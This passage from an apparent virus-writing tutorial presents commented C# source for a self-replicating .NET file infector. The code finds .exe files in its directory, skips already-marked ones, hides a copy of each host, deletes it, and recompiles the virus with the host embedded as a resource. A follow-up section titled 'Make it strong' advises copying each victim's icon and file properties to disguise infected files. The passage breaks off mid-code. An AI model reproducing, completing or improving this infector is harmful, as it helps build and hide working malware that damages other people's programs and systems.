&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span><span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> Files <span style="color: #008000;">=</span> Directory<span style="color: #008000;">.</span><span style="color: #0000FF;">GetFiles</span><span style="color: black;">&#40;</span>Directory<span style="color: #008000;">.</span><span style="color: #0000FF;">GetCurrentDirectory</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>, <span style="color: #666666;">&quot;*.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//get all .exe files in current directory</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">foreach</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">string</span> Victim <span style="color: #0600FF; font-weight: bold;">in</span> Files<span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//for loop all files in the array</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span><span style="color: black;">&#123;</span>AssemblyName<span style="color: #008000;">.</span><span style="color: #0000FF;">GetAssemblyName</span><span style="color: black;">&#40;</span>Victim<span style="color: black;">&#41;</span><span style="color: #008000;">;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//easy way to check if founded file is a .NET</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span><span style="color: black;">&#123;</span><span style="color: #0600FF; font-weight: bold;">continue</span><span style="color: #008000;">;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//if no .NET executable, try next file</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">byte</span><span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> IsMarker <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> <span style="color: #6666cc; font-weight: bold;">byte</span><span style="color: black;">&#91;</span><span style="color: #FF0000;">4</span><span style="color: black;">&#93;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//array where we read the marker</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileStream VictimFile <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> FileStream<span style="color: black;">&#40;</span>Victim, FileMode<span style="color: #008000;">.</span><span style="color: #0000FF;">Open</span>, FileAccess<span style="color: #008000;">.</span><span style="color: #0000FF;">Read</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//open potential vicitm for read</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">int</span> i <span style="color: #008000;">=</span> <span style="color: #FF0000;">0</span><span style="color: #008000;">;</span> i <span style="color: #008000;">&lt;</span> <span style="color: #FF0000;">136</span><span style="color: #008000;">;</span> i<span style="color: #008000;">++</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//skip first bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadByte</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//by reading bytes to nothing</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">Read</span><span style="color: black;">&#40;</span>IsMarker, <span style="color: #FF0000;">0</span>, Marker<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//read now 4 bytes to array</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//and close file stream</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//check if readed bytes are our infection marker, if so try next file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">if</span><span style="color: black;">&#40;</span>IsMarker<span style="color: black;">&#91;</span><span style="color: #FF0000;">0</span><span style="color: black;">&#93;</span> <span style="color: #008000;">==</span> Marker<span style="color: black;">&#91;</span><span style="color: #FF0000;">0</span><span style="color: black;">&#93;</span> <span style="color: #008000;">&amp;&amp;</span> IsMarker<span style="color: black;">&#91;</span><span style="color: #FF0000;">1</span><span style="color: black;">&#93;</span> <span style="color: #008000;">==</span> Marker<span style="color: black;">&#91;</span><span style="color: #FF0000;">1</span><span style="color: black;">&#93;</span> <span style="color: #008000;">&amp;&amp;</span> IsMarker<span style="color: black;">&#91;</span><span style="color: #FF0000;">2</span><span style="color: black;">&#93;</span> <span style="color: #008000;">==</span> Marker<span style="color: black;">&#91;</span><span style="color: #FF0000;">2</span><span style="color: black;">&#93;</span> <span style="color: #008000;">&amp;&amp;</span> IsMarker<span style="color: black;">&#91;</span><span style="color: #FF0000;">3</span><span style="color: black;">&#93;</span> <span style="color: #008000;">==</span> Marker<span style="color: black;">&#91;</span><span style="color: #FF0000;">3</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #0600FF; font-weight: bold;">continue</span><span style="color: #008000;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span> ResourceFile <span style="color: #008000;">=</span> Victim<span style="color: #008000;">.</span><span style="color: #0600FF; font-weight: bold;">Remove</span><span style="color: black;">&#40;</span>Victim<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span> <span style="color: #008000;">-</span> <span style="color: #FF0000;">3</span>, <span style="color: #FF0000;">3</span><span style="color: black;">&#41;</span> <span style="color: #008000;">+</span> <span style="color: #666666;">&quot;res&quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//create temp file name for the host resource</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">Copy</span><span style="color: black;">&#40;</span>Victim, ResourceFile<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//copy uninfected host to temporary file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">SetAttributes</span><span style="color: black;">&#40;</span>ResourceFile, FileAttributes<span style="color: #008000;">.</span><span style="color: #0000FF;">Hidden</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//and set it to hidden</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span><span style="color: black;">&#123;</span>File<span style="color: #008000;">.</span><span style="color: #0000FF;">Delete</span><span style="color: black;">&#40;</span>Victim<span style="color: black;">&#41;</span><span style="color: #008000;">;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//try to delete the victim</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">Delete</span><span style="color: black;">&#40;</span>ResourceFile<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//if it still run, delete temp resource file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">continue</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//and leave it uninfected</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span> <span style="color: black; font-style: italic;">//action! try to compile virus source with source and host binary as resource</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ICodeCompiler Compiler <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> CSharpCodeProvider<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">CreateCompiler</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//create compiler</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CompilerParameters Parameter <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> CompilerParameters<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//and it's parameters</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Parameter<span style="color: #008000;">.</span><span style="color: #0000FF;">GenerateExecutable</span> <span style="color: #008000;">=</span> <span style="color: #0600FF; font-weight: bold;">true</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//we want to create a exe, sure</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Parameter<span style="color: #008000;">.</span><span style="color: #0000FF;">MainClass</span> <span style="color: #008000;">=</span> <span style="color: #666666;">&quot;Biskin.DiA&quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//the main class, we are now in it</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Parameter<span style="color: #008000;">.</span><span style="color: #0000FF;">OutputAssembly</span> <span style="color: #008000;">=</span> Victim<span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//compile output, the victim name (we deleted it already)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//some raw compiler commands, optimize output, make windows application (no command prompt shit)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//and add via &quot;/resource&quot; the host binary (we copy it before) and the virus source (we extracted it before)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Parameter<span style="color: #008000;">.</span><span style="color: #0000FF;">CompilerOptions</span> <span style="color: #008000;">=</span> <span style="color: #666666;">&quot;/optimize /target:winexe /resource:&quot;</span> <span style="color: #008000;">+</span> ResourceFile <span style="color: #008000;">+</span> <span style="color: #666666;">&quot;,host.bin /resource:&quot;</span> <span style="color: #008000;">+</span> SourceName <span style="color: #008000;">+</span> <span style="color: #666666;">&quot;,biskin.src&quot;</span><span style="color: #008000;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">foreach</span><span style="color: black;">&#40;</span>Assembly Asm <span style="color: #0600FF; font-weight: bold;">in</span> AppDomain<span style="color: #008000;">.</span><span style="color: #0000FF;">CurrentDomain</span><span style="color: #008000;">.</span><span style="color: #0000FF;">GetAssemblies</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//lazy style</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Parameter<span style="color: #008000;">.</span><span style="color: #0000FF;">ReferencedAssemblies</span><span style="color: #008000;">.</span><span style="color: #0600FF; font-weight: bold;">Add</span><span style="color: black;">&#40;</span>Asm<span style="color: #008000;">.</span><span style="color: #0000FF;">Location</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//just reference all assemblies we found, so we are sure our virus has all to compile</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">if</span><span style="color: black;">&#40;</span>Compiler<span style="color: #008000;">.</span><span style="color: #0000FF;">CompileAssemblyFromFile</span><span style="color: black;">&#40;</span>Parameter, SourceName<span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">Errors</span><span style="color: #008000;">.</span><span style="color: #0000FF;">Count</span> <span style="color: #008000;">==</span> <span style="color: #FF0000;">0</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//compile! and check if no compile errors</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> FileStream<span style="color: black;">&#40;</span>Victim, FileMode<span style="color: #008000;">.</span><span style="color: #0000FF;">Open</span>, FileAccess<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadWrite</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//open the freshly compiled executable</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">int</span> i <span style="color: #008000;">=</span> <span style="color: #FF0000;">0</span><span style="color: #008000;">;</span> i <span style="color: #008000;">&lt;</span> <span style="color: #FF0000;">136</span><span style="color: #008000;">;</span> i<span style="color: #008000;">++</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//skip first bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadByte</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//by read bytes to nothing</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">Write</span><span style="color: black;">&#40;</span>Marker, <span style="color: #FF0000;">0</span>, Marker<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//then write our infection marker to WIN32_VERSION in the PE header (unused space)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VictimFile<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//close file stream</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">else</span> <span style="color: black; font-style: italic;">//argh, compiler error</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">Copy</span><span style="color: black;">&#40;</span>ResourceFile, Victim<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//copy resource file back to real name, and leave it uninfected</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">Delete</span><span style="color: black;">&#40;</span>ResourceFile<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//delete reosurce file and handle next file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//any error is redirected here, just do nothing</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span><span style="color: black;">&#123;</span>File<span style="color: #008000;">.</span><span style="color: #0000FF;">Delete</span><span style="color: black;">&#40;</span>SourceName<span style="color: black;">&#41;</span><span style="color: #008000;">;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//try to delete source file, should work</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span><span style="color: black;">&#123;</span>File<span style="color: #008000;">.</span><span style="color: #0000FF;">SetAttributes</span><span style="color: black;">&#40;</span>SourceName, FileAttributes<span style="color: #008000;">.</span><span style="color: #0000FF;">Hidden</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span><span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//if it's still in use just set it to hidden</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//done.</span><br/>
&nbsp;</div>
<h2><a name="c6"></a>Make it strong, further ideas</h2>
<p>Sure, the provided source code is just a proof of concept, and not done to stay in the wild or anything like that. Here are some add's you have to make if you want make this virus (or your virus) a good one:</p>
<p><strong>Where is my icon?</strong></p>
<p>The icon of the compiled virus (within host) is the default windows application icon, cause we didn't give the compiler any icon. To prevent this, just extract the icon from the potential victim (google hint: Code Corner - Tools - Icon Browser), and give it as compiler parameter "/win32icon:filename". After that delete the extracted icon.</p>
<p>And all is fine.</p>
<p><strong>And where are my file properties?</strong></p>
<p>Also the compiled file don't have any properties, such as Name, Copyright, Trademark, etc. This is also very simple issue, properties of the file can be read like this:</p>
<div class="csharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; <span style="color: black; font-style: italic;">//...</span><br/>
&nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">foreach</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">object</span> Attribute <span style="color: #0600FF; font-weight: bold;">in</span> Assembly<span style="color: #008000;">.</span><span style="color: #0000FF;">LoadFrom</span><span style="color: black;">&#40;</span><span style="color: #666666;">&quot;Victim.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">GetCustomAttributes</span><span style="color: black;">&#40;</span><span style="color: #0600FF; font-weight: bold;">false</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//check all attributes</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
